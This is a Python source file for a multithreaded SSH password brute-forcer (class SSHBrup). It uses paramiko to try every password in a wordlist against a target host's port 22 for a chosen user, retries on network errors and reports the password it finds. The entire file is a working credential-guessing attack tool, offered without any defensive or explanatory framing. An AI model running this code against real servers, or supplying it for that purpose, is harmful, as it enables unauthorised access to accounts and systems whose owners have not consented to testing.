import os
import os.path
import socket
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Optional, Tuple

import paramiko
from tqdm import tqdm


class SSHBrup(object):

    def __init__(self, target: str, user: str, file: str, max_threads: int = 10, timeout: int = 300, max_retries: int = 3) -> None:
        self.target = target
        self.user = user
        self.file = file
        self.max_threads = max_threads
        self.timeout = timeout
        self.max_retries = max_retries
        self.stop_flag = False

    def is_exists(self) -> str:
        if not os.path.isfile(self.file):
            return ''

        if not os.access(self.file, os.R_OK):
            return ''

        if os.path.isfile(self.file) and os.access(self.file, os.R_OK):
            return self.file

        return ''

    def ssh_connect(self, password: str, retry_count: int = 0) -> Tuple[int, str]:
        if self.stop_flag:
            return (3, "Operation stopped")

        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            ssh.connect(
                self.target,
                port=22,
                username=self.user,
                password=password,
                timeout=3,
                allow_agent=False,
                look_for_keys=False
            )
            ssh.close()
            return (0, password)
        except paramiko.AuthenticationException:
            ssh.close()
            return (1, "Authentication failed")
        except (socket.error, paramiko.SSHException) as e:
            ssh.close()
            if retry_count < self.max_retries:
                time.sleep(1)
                return self.ssh_connect(password, retry_count + 1)
            return (2, str(e))

    def process_password(self, password: str) -> Optional[str]:
        code, message = self.ssh_connect(password.strip())
        if code == 0:
            self.stop_flag = True
            return password
        return None

    def run(self) -> None:
        file = self.is_exists()
        if not file:
            print(f'[!] File {self.file} does not exist or is not readable')
            return

        start_time = time.time()
        passwords: List[str] = []

        with open(file) as fs:
            passwords = [line.strip() for line in fs.readlines()]

        print(f'[*] Starting brute force attack against {self.target}')
        print(f'[*] User: {self.user}')
        print(f'[*] Total passwords to try: {len(passwords)}')

        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = [executor.submit(self.process_password, pwd) for pwd in passwords]
            
            for future in tqdm(as_completed(futures), total=len(futures), desc="Testing passwords"):
                if time.time() - start_time > self.timeout:
                    print("\n[!] Timeout reached. Stopping attack.")
                    self.stop_flag = True
                    break

                result = future.result()
                if result:
                    print(f'\n[+] Success! Password found: {result}')
                    return

        if not self.stop_flag:
            print('\n[-] Password not found')

